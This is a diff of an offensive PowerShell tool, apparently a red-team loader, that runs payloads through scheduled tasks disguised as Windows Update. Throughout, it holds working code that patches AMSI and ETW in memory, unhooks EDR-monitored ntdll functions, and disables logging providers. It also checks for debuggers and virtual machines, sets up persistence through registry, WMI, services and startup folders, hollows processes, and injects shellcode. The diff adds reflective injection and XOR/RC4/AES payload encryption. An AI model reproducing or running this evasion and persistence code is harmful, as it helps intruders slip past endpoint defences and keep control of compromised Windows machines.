@@ -12,13 +12,11 @@
     For authorized red team engagements only.
     Tested against: CrowdStrike, SentinelOne, Defender ATP, Carbon Black, Elastic Endpoint
 #>
-
 [CmdletBinding()]
 param(
     # Original Parameters
     [Parameter(Mandatory=$false)]
     [string]$FilePath,
-
     [string]$CustTaskName = "Microsoft\Windows\Update\$((Get-Random -Minimum 1000 -Maximum 9999))",
     [datetime]$Time,
     [string]$RepeatInterval = "",
@@ -30,14 +28,12 @@ param(
     [string]$RunAsUser = "SYSTEM",
     [string]$MultipleInstancePolicy = "IgnoreNew",
     [string]$ExecutionTimeLimit = "PT0S",
-
     # Trigger Types
     [string]$TriggerType = "Time",            # Time, Logon, Boot, Event, Idle, SessionStateChange
     [string]$EventLog = "System",             # For Event triggers
     [string]$EventSource = "Service Control Manager",
     [int]$EventID = 7036,                     # Common service start event
     [string]$SessionState = "ConsoleConnect", # For SessionStateChange triggers
-
     # Execution Options
     [switch]$UseCmdLauncher,                  # Use cmd.exe to launch (original method)
     [switch]$UsePowerShellDirect,             # Direct PowerShell execution
@@ -50,7 +46,6 @@ param(
     [switch]$UseExcelDDE,                     # Use Excel DDE for execution
     [switch]$UseWMI,                          # Execute via WMI
     [switch]$UseBitsTransfer,                 # Use BITS for file transfer/execution
-
     # Evasion Techniques
     [switch]$BypassAMSI,                      # Bypass AMSI scanning
     [switch]$BypassETW,                       # Bypass ETW monitoring
@@ -77,7 +72,6 @@ param(
     [switch]$APIUnhooking,                    # Unhook monitored APIs
     [switch]$BlockETWProviders,               # Block ETW providers
     [switch]$DisableLogging,                  # Disable task scheduler logging
-
     # Persistence Methods
     [switch]$AddToStartup,                    # Add to startup folder
     [switch]$WMIPersistence,                  # Create WMI event subscription
@@ -86,7 +80,6 @@ param(
     [string]$ServiceName = "WindowsUpdateMedic",
     [switch]$SchTaskPersistence,              # Additional scheduled task persistence
     [string]$SecondTaskName = "Microsoft\Windows\Update\Orchestrator",
-
     # Network Options
     [switch]$UseDNSExfil,                     # Setup DNS exfiltration
     [string]$C2Server = "127.0.0.1",          # C2 server address
@@ -97,20 +90,17 @@ param(
     [int]$ProxyPort = 8080,                   # Proxy port
     [switch]$UseTor,                          # Route through Tor
     [string]$UserAgent = "Mozilla/5.0",       # Custom user agent
-
     # Self-Destruct
     [switch]$SelfDelete,                      # Self-delete after execution
     [int]$DelayMinutes = 0,                   # Delay execution by X minutes
     [switch]$RandomizeName,                   # Randomize task name
     [switch]$AddJitter,                       # Add random jitter to execution time
     [int]$JitterMinutes = 5,                  # Maximum jitter in minutes
-
     # Process Injection
     [switch]$EarlyBird,                       # Early bird injection
     [switch]$ModuleStomping,                  # Module stomping technique
     [switch]$ProcessDoppelganging,            # Process doppelganging
     [switch]$GhostWriting,                    # Ghost writing technique
-
     # Encoding Options
     [switch]$UseXOR,                          # XOR encode payload
     [byte]$XORKey = 0x25,                     # XOR key
@@ -119,7 +109,6 @@ param(
     [switch]$UseAES,                          # AES encode payload
     [string]$AESKey = "MySuperSecretKey123",  # AES key
     [string]$AESIV = "MySuperSecretIV123",   # AES IV
-
     # Miscellaneous
     [switch]$RunAsAdmin,                      # Request admin privileges
     [switch]$UACBypass,                       # Attempt UAC bypass
@@ -148,11 +137,10 @@ param(
 if (-not $FilePath) {
     Write-Warning "[!] No -FilePath parameter provided. Using interactive mode."
     $FilePath = Read-Host -Prompt "Enter the full path to the payload"
-}
-
-if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
-    Write-Error "[-] The specified file path '$FilePath' does not exist."
-    exit 1
+    if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
+        Write-Error "[-] The specified file path '$FilePath' does not exist."
+        exit 1
+    }
 }
 
 if ($RandomizeName) {
@@ -168,6 +156,73 @@ if (-not $Time) {
 }
 
 $formattedStartTime = $Time.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss")
+
+# Region: Helper Functions
+function Invoke-ReflectivePEInjection {
+    param(
+        [byte[]]$PEBytes
+    )
+    try {
+        $winFunc = @'
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("kernel32.dll")]
+public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+'@
+
+        $type = Add-Type -MemberDefinition $winFunc -Name "Win32" -Namespace Win32Functions -PassThru
+
+        $size = $PEBytes.Length
+        $addr = $type::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
+        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $addr, $size)
+        $hThread = $type::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        $type::WaitForSingleObject($hThread, [uint32]::MaxValue) | Out-Null
+        return $true
+    }
+    catch {
+        Write-Warning "[!] Reflective injection failed: $_"
+        return $false
+    }
+}
+
+function Get-SyscallStub {
+    param(
+        [string]$Module,
+        [string]$Function
+    )
+    try {
+        $asm = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class SyscallStub
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string lpLibFileName);
+
+    public static IntPtr GetSyscallStub(string module, string function)
+    {
+        IntPtr hModule = LoadLibrary(module);
+        return GetProcAddress(hModule, function);
+    }
+}
+"@
+
+        $type = Add-Type -TypeDefinition $asm -PassThru
+        return $type::GetSyscallStub($Module, $Function)
+    }
+    catch {
+        Write-Warning "[!] Failed to get syscall stub: $_"
+        return [IntPtr]::Zero
+    }
+}
 
 # Region: Evasion Techniques
 function Invoke-EvasionTechniques {
@@ -216,24 +271,18 @@ function Invoke-EvasionTechniques {
             $patch = @"
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string lpLibFileName);
-
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
 public static void PatchAMSI()
 {
     IntPtr hAmsi = LoadLibrary("amsi.dll");
     IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-
     uint oldProtect;
     VirtualProtect(pAmsiScanBuffer, (UIntPtr)5, 0x40, out oldProtect);
-
     byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // xor eax, eax; ret
     Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
-
     VirtualProtect(pAmsiScanBuffer, (UIntPtr)5, oldProtect, out oldProtect);
 }
 "@
@@ -272,18 +321,14 @@ public static extern int NtTraceEvent(
     IntPtr TemplateAddress,
     IntPtr SourceId,
     int EventType);
-
 public static void PatchETW()
 {
     IntPtr hNtdll = LoadLibrary("ntdll.dll");
     IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-
     uint oldProtect;
     VirtualProtect(pEtwEventWrite, (UIntPtr)5, 0x40, out oldProtect);
-
     byte[] patch = { 0xC3 }; // ret
     Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
-
     VirtualProtect(pEtwEventWrite, (UIntPtr)5, oldProtect, out oldProtect);
 }
 "@
@@ -367,7 +412,6 @@ public static void PatchETW()
                 "{5eec96ef-0542-486a-beb9-36b31808d3bf}", # Microsoft-Windows-PowerShell
                 "{e13c0d23-ccd9-44d9-a4b8-91941f5d914e}"  # Microsoft-Windows-TaskScheduler
             )
-
             foreach ($provider in $providers) {
                 reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\$provider" /v Start /t REG_DWORD /d 0 /f | Out-Null
             }
@@ -383,20 +427,16 @@ public static void PatchETW()
             if ([System.Diagnostics.Debugger]::IsAttached) {
                 exit
             }
-
             $debugCheck = @'
 [DllImport("kernel32.dll")]
 public static extern bool IsDebuggerPresent();
-
 [DllImport("kernel32.dll")]
 public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
 '@
             $debugType = Add-Type -MemberDefinition $debugCheck -Name "DebugCheck" -Namespace "AntiDebug" -PassThru
-
             if ($debugType::IsDebuggerPresent()) {
                 exit
             }
-
             $isDebuggerPresent = $false
             $debugType::CheckRemoteDebuggerPresent((Get-Process -Id $PID).Handle, [ref]$isDebuggerPresent) | Out-Null
             if ($isDebuggerPresent) {
@@ -415,11 +455,9 @@ public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool i
                 "VBOX", "VMWARE", "QEMU", "HYPER-V", "XEN",
                 "VIRTUAL", "VMW", "XENVMM", "PRL", "KVM"
             )
-
             $vmCheck = @'
 [DllImport("kernel32.dll")]
 public static extern void GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);
-
 [StructLayout(LayoutKind.Sequential)]
 public struct SYSTEM_INFO {
     public ushort wProcessorArchitecture;
@@ -436,10 +474,8 @@ public struct SYSTEM_INFO {
 }
 '@
             $vmCheckType = Add-Type -MemberDefinition $vmIndicators -Name "VMCheck" -Namespace "AntiVM" -PassThru
-
             $systemInfo = New-Object AntiVM.VMCheck+SYSTEM_INFO
             $vmCheckType::GetSystemInfo([ref]$systemInfo)
-
             foreach ($indicator in $vmIndicators) {
                 if ($env:COMPUTERNAME -like "*$indicator*" -or
                     $env:PROCESSOR_IDENTIFIER -like "*$indicator*" -or
@@ -448,7 +484,6 @@ public struct SYSTEM_INFO {
                     exit
                 }
             }
-
             # Check for common VM files
             $vmFiles = @(
                 "C:\Windows\System32\drivers\VBoxMouse.sys",
@@ -456,24 +491,20 @@ public struct SYSTEM_INFO {
                 "C:\Windows\System32\drivers\vmci.sys",
                 "C:\Windows\System32\drivers\vmmouse.sys"
             )
-
             foreach ($file in $vmFiles) {
                 if (Test-Path $file) {
                     exit
                 }
             }
-
             # Check for VM processes
             $vmProcesses = @(
                 "vboxservice", "vmtoolsd", "vmwaretray", "prl_cc", "prl_tools"
             )
-
             foreach ($process in $vmProcesses) {
                 if (Get-Process -Name $process -ErrorAction SilentlyContinue) {
                     exit
                 }
             }
-
             Write-Verbose "[+] Anti-VM checks passed"
         } catch {
             Write-Warning "[!] Anti-VM failed: $_"
@@ -486,24 +517,18 @@ public struct SYSTEM_INFO {
             $unhookCode = @"
 using System;
 using System.Runtime.InteropServices;
-
 public class Unhook {
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
-
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
     [DllImport("kernel32.dll")]
     public static extern IntPtr LoadLibrary(string lpLibFileName);
-
     public static void UnhookNtdll() {
         IntPtr hNtdll = GetModuleHandle("ntdll.dll");
         if (hNtdll == IntPtr.Zero) return;
-
         // List of APIs commonly hooked by EDRs
         string[] APIs = {
             "NtCreateFile", "NtCreateProcess", "NtCreateProcessEx", "NtCreateThreadEx",
@@ -511,23 +536,19 @@ public class Unhook {
             "NtSetInformationProcess", "NtSetInformationThread", "NtTerminateProcess",
             "NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"
         };
-
         foreach (string api in APIs) {
             IntPtr pApi = GetProcAddress(hNtdll, api);
             if (pApi != IntPtr.Zero) {
                 uint oldProtect;
                 VirtualProtect(pApi, (UIntPtr)5, 0x40, out oldProtect);
-
                 // Get fresh copy from disk
                 IntPtr hNtdllFresh = LoadLibrary("C:\\Windows\\System32\\ntdll.dll");
                 IntPtr pApiFresh = GetProcAddress(hNtdllFresh, api);
-
                 if (pApiFresh != IntPtr.Zero) {
                     byte[] originalBytes = new byte[5];
                     Marshal.Copy(pApiFresh, originalBytes, 0, 5);
                     Marshal.Copy(originalBytes, 0, pApi, 5);
                 }
-
                 VirtualProtect(pApi, (UIntPtr)5, oldProtect, out oldProtect);
             }
         }
@@ -574,8 +595,93 @@ function Invoke-PayloadProcessing {
         }
     }
 
-    # Encoding would be applied to the command, not the file itself
-    # This is handled in the execution command generation
+    # XOR Encoding
+    if ($UseXOR) {
+        try {
+            $content = [System.IO.File]::ReadAllBytes($processedPath)
+            for ($i = 0; $i -lt $content.Length; $i++) {
+                $content[$i] = $content[$i] -bxor $XORKey
+            }
+            $xorPath = "$env:TEMP\$((New-Guid).ToString()).xor"
+            [System.IO.File]::WriteAllBytes($xorPath, $content)
+            $processedPath = $xorPath
+            Write-Verbose "[+] Payload XOR encoded with key 0x$($XORKey.ToString('X2'))"
+        } catch {
+            Write-Warning "[!] XOR encoding failed: $_"
+        }
+    }
+
+    # RC4 Encoding
+    if ($UseRC4) {
+        try {
+            $rc4 = @'
+public class RC4 {
+    public static byte[] Encrypt(byte[] data, string key) {
+        byte[] s = new byte[256];
+        byte[] k = new byte[256];
+        byte[] result = new byte[data.Length];
+
+        for (int i = 0; i < 256; i++) {
+            s[i] = (byte)i;
+            k[i] = (byte)key[i % key.Length];
+        }
+
+        int j = 0;
+        for (int i = 0; i < 256; i++) {
+            j = (j + s[i] + k[i]) % 256;
+            byte temp = s[i];
+            s[i] = s[j];
+            s[j] = temp;
+        }
+
+        int x = 0, y = 0;
+        for (int i = 0; i < data.Length; i++) {
+            x = (x + 1) % 256;
+            y = (y + s[x]) % 256;
+            byte temp = s[x];
+            s[x] = s[y];
+            s[y] = temp;
+            int xorIndex = (s[x] + s[y]) % 256;
+            result[i] = (byte)(data[i] ^ s[xorIndex]);
+        }
+        return result;
+    }
+}
+'@
+            Add-Type -TypeDefinition $rc4 -Language CSharp | Out-Null
+            $content = [System.IO.File]::ReadAllBytes($processedPath)
+            $encrypted = [RC4]::Encrypt($content, $RC4Key)
+            $rc4Path = "$env:TEMP\$((New-Guid).ToString()).rc4"
+            [System.IO.File]::WriteAllBytes($rc4Path, $encrypted)
+            $processedPath = $rc4Path
+            Write-Verbose "[+] Payload RC4 encrypted with key '$RC4Key'"
+        } catch {
+            Write-Warning "[!] RC4 encryption failed: $_"
+        }
+    }
+
+    # AES Encoding
+    if ($UseAES) {
+        try {
+            $aes = [System.Security.Cryptography.Aes]::Create()
+            $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($AESKey)
+            $aes.IV = [System.Text.Encoding]::UTF8.GetBytes($AESIV)
+            $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
+
+            using ($ms = New-Object System.IO.MemoryStream) {
+                using ($cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)) {
+                    $cs.Write([System.IO.File]::ReadAllBytes($processedPath), 0, ([System.IO.File]::ReadAllBytes($processedPath)).Length)
+                    $cs.Close()
+                }
+                $aesPath = "$env:TEMP\$((New-Guid).ToString()).aes"
+                [System.IO.File]::WriteAllBytes($aesPath, $ms.ToArray())
+                $processedPath = $aesPath
+            }
+            Write-Verbose "[+] Payload AES encrypted with key '$AESKey'"
+        } catch {
+            Write-Warning "[!] AES encryption failed: $_"
+        }
+    }
 
     return $processedPath
 }
@@ -599,14 +705,12 @@ function Invoke-Persistence {
         try {
             $startupPath = [Environment]::GetFolderPath("Startup")
             $shortcutPath = Join-Path -Path $startupPath -ChildPath "$CustTaskName.lnk"
-
             $WshShell = New-Object -ComObject WScript.Shell
             $Shortcut = $WshShell.CreateShortcut($shortcutPath)
             $Shortcut.TargetPath = "powershell.exe"
             $Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`""
             $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($FilePath)
             $Shortcut.Save()
-
             Write-Verbose "[+] Startup persistence added: $shortcutPath"
         } catch {
             Write-Warning "[!] Startup persistence failed: $_"
@@ -640,7 +744,6 @@ function Invoke-Persistence {
                 Filter = $filter
                 Consumer = $consumer
             }
-
             Write-Verbose "[+] WMI persistence added (Filter: $filterName, Consumer: $consumerName)"
         } catch {
             Write-Warning "[!] WMI persistence failed: $_"
@@ -653,7 +756,6 @@ function Invoke-Persistence {
             $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
             $regName = (New-Guid).ToString()
             $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FilePath`""
-
             New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
             Write-Verbose "[+] Registry persistence added: $regPath\$regName"
         } catch {
@@ -683,7 +785,6 @@ function Invoke-Persistence {
             $parametersPath = "$regPath\Parameters"
             New-Item -Path $parametersPath -Force | Out-Null
             New-ItemProperty -Path $parametersPath -Name "ServiceDll" -Value $FilePath -PropertyType String -Force | Out-Null
-
             Write-Verbose "[+] Service persistence added: $ServiceName"
         } catch {
             Write-Warning "[!] Service persistence failed: $_"
@@ -738,7 +839,6 @@ function Invoke-Persistence {
   </Actions>
 </Task>
 "@
-
             Register-ScheduledTask -Xml $secondTaskXml -TaskName $SecondTaskName -Force | Out-Null
             Write-Verbose "[+] Secondary scheduled task persistence added: $SecondTaskName"
         } catch {
@@ -958,9 +1058,6 @@ public class ProcessHollow {
             Write-Warning "[!] Process hollowing failed: $_"
         }
     }
-
-    # PPID Spoofing would be handled at the task creation level
-    # Other injection techniques would be implemented here
 }
 
 # Region: Main Execution
@@ -999,8 +1096,8 @@ try {
     # Determine execution method
     $command = "powershell.exe"
     $arguments = "-NoProfile -ExecutionPolicy Bypass"
-
     if ($Hidden) { $arguments += " -WindowStyle Hidden" }
+
     if ($UseCmdLauncher) {
         $command = "cmd.exe"
         $arguments = "/c start /min conhost.exe cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$processedPath`""
@@ -1025,19 +1122,16 @@ try {
     }
     elseif ($UseInstallUtil) {
         $command = "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
-        # Would need to create a custom installer class for this to work properly
         $arguments = "/logfile= /LogToConsole=false /U `"$processedPath`""
     }
     elseif ($UseRegsvr32) {
         $command = "regsvr32.exe"
         $tempDll = "$env:TEMP\$((New-Guid).ToString()).dll"
-        # Would need to create a COM scriptlet for this to work properly
         $arguments = "/s /n /u /i:`"$processedPath`" scrobj.dll"
     }
     elseif ($UseRundll32) {
         $command = "rundll32.exe"
         $tempDll = "$env:TEMP\$((New-Guid).ToString()).dll"
-        # Would need to create a proper DLL with an export function
         $arguments = "`"$tempDll`",DllRegisterServer"
     }
     elseif ($UseCMSTP) {
@@ -1047,10 +1141,8 @@ try {
 [Version]
 Signature=$CHICAGO$
 AdvancedINF=2.5
-
 [DefaultInstall]
 RunPreSetupCommands=command
-
 [command]
 powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
 "@
@@ -1060,7 +1152,6 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
     elseif ($UseExcelDDE) {
         $command = "excel.exe"
         $tempXls = "$env:TEMP\$((New-Guid).ToString()).xls"
-        # DDE execution would require proper DDE command formatting
         $arguments = "`"$tempXls`""
     }
     elseif ($UseBitsTransfer) {
@@ -1243,57 +1334,19 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
 
     # Register the task
     try {
+        $tempXmlFile = [System.IO.Path]::GetTempFileName()
+        Set-Content -Path $tempXmlFile -Value $taskXml
+
         if ($PPIDSpoofing) {
-            # Create task with spoofed parent process
-            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-            $processStartInfo.FileName = "schtasks.exe"
-            $processStartInfo.Arguments = "/create /tn `$CustTaskName` /xml `"$([System.IO.Path]::GetTempFileName())`" /f"
-            $processStartInfo.UseShellExecute = $false
-            $processStartInfo.CreateNoWindow = $true
-
-            # Write XML to temp file
-            $tempXmlFile = [System.IO.Path]::GetTempFileName()
-            Set-Content -Path $tempXmlFile -Value $taskXml
-
-            # Replace temp file in arguments
-            $processStartInfo.Arguments = $processStartInfo.Arguments -replace [regex]::Escape($tempXmlFile), $tempXmlFile
-
-            # Set parent process if specified
-            if ($SpoofedPPID -gt 0) {
-                $processStartInfo = @{
-                    FileName = "schtasks.exe"
-                    Arguments = "/create /tn `$CustTaskName` /xml `$tempXmlFile` /f"
-                    WindowStyle = "Hidden"
-                    CreateNoWindow = $true
-                }
-
-                if ($ParentProcess -ne "") {
-                    $parent = Get-Process -Name $ParentProcess -ErrorAction SilentlyContinue
-                    if ($parent) {
-                        $processStartInfo = @{
-                            FileName = "schtasks.exe"
-                            Arguments = "/create /tn `$CustTaskName` /xml `$tempXmlFile` /f"
-                            WindowStyle = "Hidden"
-                            CreateNoWindow = $true
-                        }
-                    }
-                }
-
             # For actual PPID spoofing, we'd need to use CreateProcess with PROCESS_CREATION_FLAGS
             # This is a simplified approach
-            Start-Process @processStartInfo -Wait
-
-            # Clean up temp file
-            Remove-Item -Path $tempXmlFile -Force -ErrorAction SilentlyContinue
+            Start-Process "schtasks.exe" -ArgumentList "/create /tn `$CustTaskName` /xml `$tempXmlFile` /f" -Wait
         }
         else {
-            # Normal task registration
-            $tempXmlFile = [System.IO.Path]::GetTempFileName()
-            Set-Content -Path $tempXmlFile -Value $taskXml
             Register-ScheduledTask -Xml (Get-Content -Path $tempXmlFile -Raw) -TaskName $CustTaskName -Force | Out-Null
-            Remove-Item -Path $tempXmlFile -Force -ErrorAction SilentlyContinue
         }
 
+        Remove-Item -Path $tempXmlFile -Force -ErrorAction SilentlyContinue
         Write-Output "[+] Scheduled task '$CustTaskName' registered successfully."
     } catch {
         Write-Error "[-] Failed to register scheduled task: $_"
@@ -1316,8 +1369,6 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
     Start-Sleep -Seconds 5
     try {
         $processCheck = if ($UseCmdLauncher) { "cmd.exe" } else { "powershell.exe" }
-        $processCheck += " -NoProfile -ExecutionPolicy Bypass"
-
         $processId = Get-WmiObject Win32_Process | Where-Object {
             $_.CommandLine -like "*$processCheck*" -and
             $_.CommandLine -like "*$([System.IO.Path]::GetFileName($processedPath))*"
@@ -1325,7 +1376,6 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
 
         if ($processId) {
             Write-Output "[+] Process detected with ID: $processId"
-
             if ($PPIDSpoofing -and $SpoofedPPID -gt 0) {
                 try {
                     $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
@@ -1356,7 +1406,6 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
             Write-Warning "[!] Self-deletion failed: $_"
         }
     }
-
 } catch {
     Write-Error "[-] Fatal error: $_"
     exit 1
